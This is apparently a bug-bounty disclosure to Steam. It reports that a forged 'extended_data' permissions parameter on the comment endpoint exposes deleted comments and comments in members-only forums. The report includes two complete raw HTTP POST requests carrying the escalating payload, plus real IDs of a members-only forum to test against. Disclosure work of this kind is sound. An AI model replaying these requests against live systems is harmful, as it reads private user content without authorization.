  "vulnerability_information": "hi,\n\nFor a forum's discussion, only ` moderator+ ` ranks are allowed to **view comments which have been deleted** by a ` officer/moderator `. \n\nI have found an issue where a ` member `(who is not allowed to view deleted comments) can get read access to the deleted comments on a forum's discussion.\n\nAlso, a ` non-member ` who ` can't view the discussions belonging to an unauthorized forum `, can **expose the comments** on discussions of such forums. He can get read access to all i.e ` even deleted ` comments on such forums.\n\n\n##Steps to reproduce:\n###First we try to expose deleted comments to a member rank user\n\n* Have a forum with such permissions:\n{F256910}\nSo, here ` members ` can view the discussions belonging to this forum, but aren't allowed to view any deleted comments.\n\nAlso, ` non-members ` **can't even view the discussions.**\n* In the forum, have a discussion, which has some comments, and delete a few of them.\n\n* From ` member ` account, visit the target discussion, ` view-source ` of the page, search for ` forumtopic_ ` where you will find the **GroupId**, **forumId**, **discussion-id** in ` ForumTopic_***GroupID***_***forumID***_***discussionID***  `  format. Note these down.\n* now, with credentials (` cookies/sessionId `) belonging to a ` member ` account, make the following request:\n\n```\nPOST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1\nHost: steamcommunity.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Length: 597\nCookie: ***********member-cookies****\nConnection: close\n\ngidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true\n\n\n\n```\n\nProvide the IDs you noted down as stated in the request. Keep the ` extended_data ` param as it is.\n\n* send the request through\n* in the response search for ` comments_raw `, you will see that even the deleted comments were shown to you.\n\n\n###now Lets attempt to expose comments to a user who is not allowed to view the forum\n\n* Now, with credentials (` cookies/sessionId `) belonging to a ` non-member ` account, make the following request:\n\n```\nPOST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1\nHost: steamcommunity.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Length: 597\nCookie: ***********member-cookies****\nConnection: close\n\ngidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true\n\n```\nProvide the same IDs as in the previous request. Or you can try with ` ForumTopic_103582791461362746_1692659135923574526_1692659769940104935 `, these IDs belong to a **Group-->forum** which has view permissions set to ` members-only `.\n\nIn response, search for ` comments_raw  `, you will see all comments were exposed to a user who ` does not even have the permission to view this discussion `.\n\n## Impact\n\n* ` Non-members ` without having the access to ` view a forum ` can get **read access** to all comments including deleted comments on such forum discussions. \n* ` Members ` get **read access** to ` deleted comments ` on forum discussions.\n\nAll these attacks require no user interaction, i.e attacker can ex-filtrate these on his own machine.\n\n\nthanks,\nTabahi",
